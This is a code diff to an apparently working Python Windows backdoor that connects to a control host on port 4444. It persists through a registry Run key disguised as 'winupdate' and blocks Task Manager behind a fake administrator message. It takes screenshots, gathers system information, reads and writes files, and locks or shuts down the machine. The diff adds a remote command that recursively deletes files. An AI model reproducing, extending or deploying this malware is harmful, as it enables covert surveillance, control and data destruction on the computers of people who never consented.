@@ -5,6 +5,7 @@ import time
 import ctypes
 import socket
 import base64
+import shutil
 import Spyware
 import datetime
 import pyautogui
@@ -12,7 +13,7 @@ import subprocess
 from winreg import *
 from shutil import copyfile
 
-class Backdoor:
+class backdoor:
     PATH = os.path.realpath(sys.argv[0])
     TMP = os.environ["TEMP"]
     APPDATA = os.environ["APPDATA"]
@@ -41,9 +42,9 @@ class Backdoor:
             obj_reg_key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
             SetValueEx(obj_reg_key, "winupdate", 0, REG_SZ, str_app_path)
             CloseKey(obj_reg_key)
-        except WindowsError:
+        except WindowsError as we:
             if not onstartup:
-                return "[-] Unable to add to Startup."
+                return "[-] Unable to add to Startup: ".format(we)
         else:
             if not onstartup:
                 return "[+] Added to Startup successfully."
@@ -53,10 +54,10 @@ class Backdoor:
             obj_reg_key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
             DeleteValue(obj_reg_key, "winupdate")
             CloseKey(obj_reg_key)
-        except FileNotFoundError:
-            return "[-] Program is not registered in Startup."
-        except WindowsError:
-            return "[-] Error removing value."
+        except FileNotFoundError as fnfe:
+            return "[-] Program is not registered in Startup: {}".format(fnfe)
+        except WindowsError as we:
+            return "[-] Error removing value: {}".format(we)
         else:
             return "[+] Removed from Startup successfully."
 
@@ -112,19 +113,23 @@ class Backdoor:
                         shell=True)
 
     def change_state_task_manager(self):
-        global should_disable
-        if not self.should_disable_tm:
-            subprocess.Popen(["taskkill", "/f", "/im", "cscript.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                            stdin=subprocess.PIPE, shell=True)
+        global should_disable_tm
 
-            self.should_disable_tm = True
-            return "[+] Task Manager Enabled."
-        else:
-            popup = ["Task Manager has been disabled by your administrator", "Task Manager", "3", "16"]
+        try:
+            if not self.should_disable_tm:
+                subprocess.Popen(["taskkill", "/f", "/im", "cscript.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                stdin=subprocess.PIPE, shell=True)
+            
+                self.should_disable_tm = True
+                return "[+] Task Manager Enabled."
+            else:
+                popup = ["Task Manager has been disabled by your administrator", "Task Manager", "3", "16"]
 
-            self.vbs_block_process("taskmgr.exe", popup=popup)
-            self.should_disable_tm = False
-            return "[+] Task Manager Disabled."
+                self.vbs_block_process("taskmgr.exe", popup=popup)
+                self.should_disable_tm = False
+                return "[+] Task Manager Disabled."
+        except Exception as e:
+            return "[-] Couldn't change the State of the Task Manager: {}".format(e)
 
     def take_screenshot(self):
         try:
@@ -142,23 +147,36 @@ class Backdoor:
         try:
             spyware = Spyware.spyware()
             return spyware.report()
-        except Exception:
-            return "[-] Unable to get System Information."
+        except Exception as e:
+            return "[-] Unable to get System Information: {}".format(e)
 
     def lock_system(self):
         try:
             ctypes.windll.user32.LockWorkStation()
             return "[+] Locked the System."
-        except Exception:
-            return "[-] Unable to Lock the System."
+        except Exception as e:
+            return "[-] Unable to Lock the System: {}".format(e)
 
     def shutdown_system(self, shutdowntype):
-        command = f"shutdown {shutdowntype} -f"
-        subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
+        try:
+            command = f"shutdown {shutdowntype} -f"
+            subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
+            
+            self.connection.close()
+            sys.exit(0)
+        except Exception as e:
+            return "[-] Unable to Shutdown the System: {}".format(e)
         
-        self.connection.close()
-        sys.exit(0)
-        
+    def delete_file_from_system(self, path):
+        try:
+            if os.path.exists(path):
+                shutil.rmtree(path)
+                return "[+] Successfully deleted this File/Folder."
+            else:
+                return "[-] The path specified does not exist."
+        except Exception:
+            return "[-] Unable to delete this File/Folder."
+
     def run(self):
         while True:
             command = self.reliable_receive()
@@ -172,8 +190,8 @@ class Backdoor:
                     command_result = self.read_file(command[1]).decode()
                 elif command[0] == "u":
                     command_result = self.write_file(command[1], command[2])
-                elif command[0] == "s":
-                    command_result = self.take_screenshot()
+                #elif command[0] == "s":
+                 #   command_result = self.take_screenshot()
                 elif command[0] == "si":
                     command_result = self.get_system_info()
                 elif command[0] == "tm":
@@ -182,6 +200,8 @@ class Backdoor:
                     command_result = self.startup(False)
                 elif command[0] == "rst":
                     command_result = self.remove_from_startup()
+                elif command[0] == "del" and len(command[1]) > 1:
+                    command_result = self.delete_file_from_system(command[1])                    
                 elif (command[0] == "cs" or command[0] == "changestate") and command[1] == "1":
                     command_result = self.lock_system()
                 elif (command[0] == "cs" or command[0] == "changestate") and command[1] == "2":
@@ -199,7 +219,7 @@ class Backdoor:
             self.reliable_send(command_result)
 
 try:
-    my_backdoor = Backdoor("192.168.19.1", 4444)
-    my_backdoor.run()
+    executable = backdoor("192.168.19.1", 4444)
+    executable.run()
 except Exception:
     sys.exit()
